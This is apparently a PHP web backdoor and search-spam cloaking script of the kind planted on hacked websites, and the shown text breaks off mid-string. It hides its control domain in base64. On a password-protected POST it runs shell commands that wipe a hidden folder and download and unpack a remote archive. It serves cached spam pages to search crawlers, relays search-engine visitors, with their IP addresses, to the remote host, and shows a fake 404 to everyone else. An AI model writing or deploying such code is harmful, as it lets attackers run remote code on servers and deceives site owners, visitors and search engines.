<?php


set_time_limit(0);
function get_page_by_curl(
    $url,
    $useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36"
) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

$doorcontent = "";
$x           = @$_POST["pppp_check"];
$md5pass     = "e5e4570182820af0a183ce1520afe43b";
$host        = @$_SERVER["HTTP_HOST"];
$uri         = @$_SERVER["REQUEST_URI"];
$host        = str_replace("www.", "", $host);
$md5host     = md5($host);
$urx         = $host . $uri;
$md5urx      = md5($urx);

if (function_exists('sys_get_temp_dir')) {
    $tmppath = sys_get_temp_dir();
    if ( ! is_dir($tmppath)) {
        $tmppath = (dirname(__FILE__));
    }
} else {
    $tmppath = (dirname(__FILE__));
}

$cdir   = $tmppath . "/." . $md5host . "/";
$domain = base64_decode("eDMubWVnYWxvbGlrLmNvbQ==");
if ($x != "") {
    $p = md5(base64_decode(@$_POST["p"]));
    if ($p != $md5pass) {
        return;
    }
    if (($x == "2") || ($x == "4")) {
        echo "###UPDATING_FILES###\n";
        if ($x == "2") {
            $cmd = "cd $tmppath; rm -rf .$md5host";
            echo shell_exec($cmd);
        }
        $cmd = "cd $tmppath; wget http://$domain/outp/wp/arc/$md5host.tgz -O 1.tgz; tar -xzf 1.tgz; rm -rf 1.tgz";
        echo shell_exec($cmd);
        exit;
    }
    if ($x == "3") {
        echo "###WORKED###\n";
        exit;
    }
} else {
    $curx = $cdir . $md5urx;
    if (@file_exists($curx)) {
        @list($IDpack, $mk, $doorcontent) = @explode("|||", @base64_decode(@file_get_contents($curx)));
        $bot    = 0;
        $se     = 0;
        $mobile = 0;
        if (preg_match("#google|gsa-crawler|AdsBot-Google|Mediapartners|Googlebot-Mobile|spider|bot|yahoo|google web preview|mail\.ru|crawler|baiduspider#i",
            @$_SERVER["HTTP_USER_AGENT"])) {
            $bot = 1;
        }
        if (preg_match("#android|symbian|iphone|ipad|series60|mobile|phone|wap|midp|mobi|mini#i",
            @$_SERVER["HTTP_USER_AGENT"])) {
            $mobile = 1;
        }
        if (preg_match("#google|bing\.com|msn\.com|ask\.com|aol\.com|altavista|search|yahoo|conduit\.com|charter\.net|wow\.com|mywebsearch\.com|handycafe\.com|babylon\.com#i",
            @$_SERVER["HTTP_REFERER"])) {
            $se = 1;
        }
        if ($bot) {
            echo $doorcontent;
            exit;
        }
        if ($se) {
            echo get_page_by_curl("http://$domain/lp.php?ip=" . $IDpack . "&mk=" . rawurlencode($mk) . "&d=" . $md5host . "&u=" . $md5urx . "&addr=" . $_SERVER["REMOTE_ADDR"],
                @$_SERVER["HTTP_USER_AGENT"]);
            exit;
        }
        header($_SERVER['SERVER_PROTOCOL'] . " 404 Not Found");
        echo '' . "\n";
        echo '' . "\n";
        echo '' . "\n";
        echo '' . "\n";
        echo '